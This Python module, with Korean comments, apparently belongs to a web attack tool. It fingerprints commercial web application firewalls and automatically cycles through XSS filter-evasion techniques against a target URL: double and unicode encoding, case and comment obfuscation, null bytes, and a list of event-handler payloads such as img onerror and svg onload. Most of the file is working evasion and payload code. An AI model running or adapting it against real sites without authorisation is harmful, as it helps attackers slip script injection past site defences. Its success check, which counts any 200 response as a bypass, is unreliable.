"""
WAF Handler: Web Application Firewall 탐지 및 우회

최신 WAF 우회 기법 (2025):
- Double encoding
- Event handlers (onerror, onclick)
- Header injection
- Parsing discrepancies
- HTML entity encoding

참고:
- PortSwigger XSS Cheat Sheet 2025
- WAFFLED: Parsing Discrepancies to Bypass WAFs
"""

from dataclasses import dataclass, field
from typing import List, Optional, Dict, Any, Tuple
import re
from playwright.sync_api import Page, Response


@dataclass
class WAFSignature:
    """WAF 시그니처"""
    name: str
    headers: Dict[str, str] = field(default_factory=dict)
    response_patterns: List[str] = field(default_factory=list)
    status_codes: List[int] = field(default_factory=list)


@dataclass
class WAFDetectionResult:
    """WAF 탐지 결과"""
    detected: bool
    waf_name: Optional[str] = None
    confidence: float = 0.0  # 0.0 ~ 1.0
    evidence: List[str] = field(default_factory=list)
    blocked: bool = False  # 요청이 차단되었는지


@dataclass
class BypassResult:
    """우회 시도 결과"""
    bypassed: bool
    technique: str
    payload: str
    response_status: int
    response_body: str


class WAFDetector:
    """
    WAF 탐지기

    주요 WAF:
    - Cloudflare
    - AWS WAF
    - ModSecurity
    - Akamai
    - Imperva (Incapsula)
    """

    # WAF 시그니처 정의
    SIGNATURES = {
        'Cloudflare': WAFSignature(
            name='Cloudflare',
            headers={'server': 'cloudflare', 'cf-ray': ''},
            response_patterns=[
                'Attention Required',
                'Cloudflare Ray ID',
                'cloudflare.com/5xx-error'
            ],
            status_codes=[403, 503]
        ),
        'AWS WAF': WAFSignature(
            name='AWS WAF',
            headers={'x-amzn-requestid': '', 'x-amzn-errortype': ''},
            response_patterns=[
                'Request blocked',
                'AWS WAF',
                'Access Denied'
            ],
            status_codes=[403]
        ),
        'ModSecurity': WAFSignature(
            name='ModSecurity',
            headers={},
            response_patterns=[
                'ModSecurity',
                '406 Not Acceptable',
                'mod_security'
            ],
            status_codes=[406, 403]
        ),
        'Akamai': WAFSignature(
            name='Akamai',
            headers={'server': 'AkamaiGHost'},
            response_patterns=[
                'Reference #',
                'AkamaiGHost'
            ],
            status_codes=[403]
        ),
        'Imperva': WAFSignature(
            name='Imperva',
            headers={'x-cdn': 'Incapsula'},
            response_patterns=[
                'incapsula',
                'Incapsula incident ID'
            ],
            status_codes=[403]
        )
    }

    def __init__(self, page: Page):
        """
        Args:
            page: Playwright Page 객체
        """
        self.page = page

    def detect(self, url: str, test_payload: str = "<script>alert(1)</script>") -> WAFDetectionResult:
        """
        WAF 탐지

        Args:
            url: 테스트할 URL
            test_payload: 테스트 페이로드

        Returns:
            WAFDetectionResult
        """
        evidence = []

        # 정상 요청
        try:
            normal_response = self.page.goto(url, wait_until='networkidle', timeout=10000)
            normal_status = normal_response.status
        except Exception as e:
            return WAFDetectionResult(
                detected=False,
                evidence=[f"Normal request failed: {e}"]
            )

        # 악의적 페이로드로 테스트
        test_url = f"{url}?test={test_payload}"
        try:
            test_response = self.page.goto(test_url, wait_until='networkidle', timeout=10000)
            test_status = test_response.status
            test_body = self.page.content()
            test_headers = test_response.headers
        except Exception as e:
            return WAFDetectionResult(
                detected=True,
                evidence=[f"Malicious request blocked: {e}"],
                blocked=True
            )

        # 상태 코드 분석
        if test_status in [403, 406, 503]:
            evidence.append(f"Blocked with status {test_status}")

        # 헤더 분석
        detected_waf = None
        max_confidence = 0.0

        for waf_name, signature in self.SIGNATURES.items():
            confidence = 0.0
            waf_evidence = []

            # 헤더 매칭
            for header_key, header_value in signature.headers.items():
                if header_key.lower() in test_headers:
                    actual_value = test_headers[header_key.lower()]
                    if not header_value or header_value.lower() in actual_value.lower():
                        confidence += 0.3
                        waf_evidence.append(f"Header: {header_key}={actual_value}")

            # 응답 본문 패턴 매칭
            for pattern in signature.response_patterns:
                if pattern.lower() in test_body.lower():
                    confidence += 0.4
                    waf_evidence.append(f"Pattern: {pattern}")

            # 상태 코드 매칭
            if test_status in signature.status_codes:
                confidence += 0.3
                waf_evidence.append(f"Status: {test_status}")

            if confidence > max_confidence:
                max_confidence = confidence
                detected_waf = waf_name
                evidence = waf_evidence

        # WAF 탐지 판정
        detected = max_confidence > 0.5 or test_status in [403, 406]

        return WAFDetectionResult(
            detected=detected,
            waf_name=detected_waf,
            confidence=max_confidence,
            evidence=evidence,
            blocked=(test_status != 200)
        )


class WAFBypassTechniques:
    """
    WAF 우회 기법 모음

    2025년 최신 기법:
    - Double encoding
    - Event handlers
    - HTML entity encoding
    - Case variation
    - Comment insertion
    - Null bytes
    """

    @staticmethod
    def double_encode(payload: str) -> str:
        """
        Double encoding (이중 인코딩)

        예: <script> → %253Cscript%253E

        Args:
            payload: 원본 페이로드

        Returns:
            이중 인코딩된 페이로드
        """
        import urllib.parse
        # 1차 인코딩
        encoded_once = urllib.parse.quote(payload)
        # 2차 인코딩
        encoded_twice = urllib.parse.quote(encoded_once)
        return encoded_twice

    @staticmethod
    def unicode_encode(payload: str) -> str:
        """
        Unicode encoding

        예: <script> → \u003cscript\u003e

        Args:
            payload: 원본 페이로드

        Returns:
            유니코드 인코딩된 페이로드
        """
        result = ""
        for char in payload:
            if char.isalnum():
                result += char
            else:
                result += f"\\u{ord(char):04x}"
        return result

    @staticmethod
    def html_entity_encode(payload: str, full: bool = False) -> str:
        """
        HTML entity encoding

        예: <script> → &#60;script&#62;

        Args:
            payload: 원본 페이로드
            full: 모든 문자를 인코딩할지 여부

        Returns:
            HTML 엔티티 인코딩된 페이로드
        """
        if full:
            return ''.join([f"&#{ord(c)};" for c in payload])
        else:
            # 특수 문자만 인코딩
            replacements = {
                '<': '&lt;',
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#x27;',
                '/': '&#x2F;'
            }
            result = payload
            for char, entity in replacements.items():
                result = result.replace(char, entity)
            return result

    @staticmethod
    def event_handler_variant(base_payload: str = "alert(1)") -> List[str]:
        """
        Event handler 변형

        <script> 대신 event handler 사용

        Args:
            base_payload: 기본 JavaScript 코드

        Returns:
            Event handler 페이로드 리스트
        """
        return [
            f'<img src=x onerror={base_payload}>',
            f'<svg onload={base_payload}>',
            f'<body onload={base_payload}>',
            f'<input onfocus={base_payload} autofocus>',
            f'<select onfocus={base_payload} autofocus>',
            f'<textarea onfocus={base_payload} autofocus>',
            f'<keygen onfocus={base_payload} autofocus>',
            f'<video><source onerror={base_payload}>',
            f'<audio src=x onerror={base_payload}>',
            f'<details open ontoggle={base_payload}>'
        ]

    @staticmethod
    def case_obfuscation(payload: str) -> str:
        """
        대소문자 난독화

        예: <ScRiPt>AleRt(1)</sCrIpT>

        Args:
            payload: 원본 페이로드

        Returns:
            대소문자 난독화된 페이로드
        """
        import random
        result = ""
        for char in payload:
            if char.isalpha():
                result += char.upper() if random.random() > 0.5 else char.lower()
            else:
                result += char
        return result

    @staticmethod
    def comment_insertion(payload: str) -> str:
        """
        주석 삽입

        예: <scr<!---->ipt>alert(1)</scr<!---->ipt>

        Args:
            payload: 원본 페이로드

        Returns:
            주석이 삽입된 페이로드
        """
        # 키워드 중간에 주석 삽입
        keywords = ['script', 'alert', 'onerror', 'onload']

        result = payload
        for keyword in keywords:
            if keyword in result.lower():
                # 키워드를 찾아서 중간에 주석 삽입
                idx = result.lower().index(keyword)
                actual_keyword = result[idx:idx+len(keyword)]
                mid = len(actual_keyword) // 2
                obfuscated = actual_keyword[:mid] + '<!---->' + actual_keyword[mid:]
                result = result[:idx] + obfuscated + result[idx+len(keyword):]
        return result

    @staticmethod
    def null_byte_insertion(payload: str) -> str:
        """
        NULL 바이트 삽입

        예: <script>ale\x00rt(1)</script>

        Args:
            payload: 원본 페이로드

        Returns:
            NULL 바이트가 삽입된 페이로드
        """
        keywords = ['alert', 'script', 'onerror']

        result = payload
        for keyword in keywords:
            if keyword in result.lower():
                idx = result.lower().index(keyword)
                actual_keyword = result[idx:idx+len(keyword)]
                mid = len(actual_keyword) // 2
                obfuscated = actual_keyword[:mid] + '\x00' + actual_keyword[mid:]
                result = result[:idx] + obfuscated + result[idx+len(keyword):]
        return result


class WAFHandler:
    """
    WAF 핸들러

    WAF 탐지 및 우회 통합 관리
    """

    def __init__(self, page: Page):
        """
        Args:
            page: Playwright Page 객체
        """
        self.page = page
        self.detector = WAFDetector(page)

    def detect_and_bypass(
        self,
        url: str,
        original_payload: str,
        max_attempts: int = 10
    ) -> Tuple[WAFDetectionResult, Optional[BypassResult]]:
        """
        WAF 탐지 및 우회 시도

        Args:
            url: 테스트할 URL
            original_payload: 원본 페이로드
            max_attempts: 최대 우회 시도 횟수

        Returns:
            (WAF 탐지 결과, 우회 결과 또는 None)
        """
        # 1. WAF 탐지
        detection = self.detector.detect(url, original_payload)

        if not detection.detected:
            # WAF 없음 - 원본 페이로드 사용 가능
            return detection, None

        # 2. WAF 우회 시도
        print(f"[WAF Detected] {detection.waf_name or 'Unknown'} (Confidence: {detection.confidence:.2f})")
        print(f"[+] Attempting bypass with {max_attempts} techniques...")

        bypass_techniques = [
            ('double_encode', lambda p: WAFBypassTechniques.double_encode(p)),
            ('unicode_encode', lambda p: WAFBypassTechniques.unicode_encode(p)),
            ('html_entity', lambda p: WAFBypassTechniques.html_entity_encode(p)),
            ('case_obfuscation', lambda p: WAFBypassTechniques.case_obfuscation(p)),
            ('comment_insertion', lambda p: WAFBypassTechniques.comment_insertion(p)),
            ('null_byte', lambda p: WAFBypassTechniques.null_byte_insertion(p)),
        ]

        # Event handler 변형도 추가
        event_handlers = WAFBypassTechniques.event_handler_variant()
        for i, handler in enumerate(event_handlers[:5]):  # 처음 5개만
            bypass_techniques.append((f'event_handler_{i}', lambda p, h=handler: h))

        # 각 기법 시도
        for technique_name, technique_func in bypass_techniques[:max_attempts]:
            try:
                bypassed_payload = technique_func(original_payload)

                test_url = f"{url}?test={bypassed_payload}"
                response = self.page.goto(test_url, wait_until='networkidle', timeout=10000)

                status = response.status
                body = self.page.content()

                # 성공 판정: 200 OK or 페이로드가 반사됨
                bypassed = (status == 200) or (bypassed_payload in body)

                if bypassed:
                    print(f"[OK] Bypassed with: {technique_name}")
                    return detection, BypassResult(
                        bypassed=True,
                        technique=technique_name,
                        payload=bypassed_payload,
                        response_status=status,
                        response_body=body[:200]
                    )

            except Exception as e:
                # 이 기법은 실패 - 다음 기법 시도
                continue

        # 모든 기법 실패
        print(f"[FAIL] All bypass attempts failed")
        return detection, None


# ========================================
# 유틸리티 함수
# ========================================

def test_waf_detection(page: Page, url: str):
    """WAF 탐지 테스트"""
    detector = WAFDetector(page)
    result = detector.detect(url)

    print("\n" + "="*60)
    print("WAF Detection Result")
    print("="*60)
    print(f"Detected: {result.detected}")
    print(f"WAF Name: {result.waf_name or 'Unknown'}")
    print(f"Confidence: {result.confidence:.2f}")
    print(f"Blocked: {result.blocked}")
    if result.evidence:
        print(f"Evidence:")
        for evidence in result.evidence:
            print(f"  - {evidence}")
    print("="*60 + "\n")


if __name__ == "__main__":
    """
    사용 예제
    """
    print("""
WAF Handler Module

Usage:
    from playwright.sync_api import sync_playwright
    from waf_handler import WAFHandler

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()

        handler = WAFHandler(page)

        # WAF 탐지 및 우회
        detection, bypass = handler.detect_and_bypass(
            url='http://example.com',
            original_payload='<script>alert(1)</script>',
            max_attempts=10
        )

        if bypass and bypass.bypassed:
            print(f"WAF bypassed with: {bypass.technique}")
            print(f"Payload: {bypass.payload}")

        browser.close()

For detailed examples, see tests/test_waf_handler.py
""")

    # 우회 기법 데모
    print("\n[Demo] WAF Bypass Techniques\n")

    test_payload = "<script>alert(1)</script>"

    print(f"Original: {test_payload}\n")

    print("1. Double Encoding:")
    print(f"   {WAFBypassTechniques.double_encode(test_payload)}\n")

    print("2. Unicode Encoding:")
    print(f"   {WAFBypassTechniques.unicode_encode(test_payload)}\n")

    print("3. HTML Entity:")
    print(f"   {WAFBypassTechniques.html_entity_encode(test_payload)}\n")

    print("4. Case Obfuscation:")
    print(f"   {WAFBypassTechniques.case_obfuscation(test_payload)}\n")

    print("5. Comment Insertion:")
    print(f"   {WAFBypassTechniques.comment_insertion(test_payload)}\n")

    print("6. Event Handlers:")
    for i, handler in enumerate(WAFBypassTechniques.event_handler_variant()[:3], 1):
        print(f"   [{i}] {handler}")
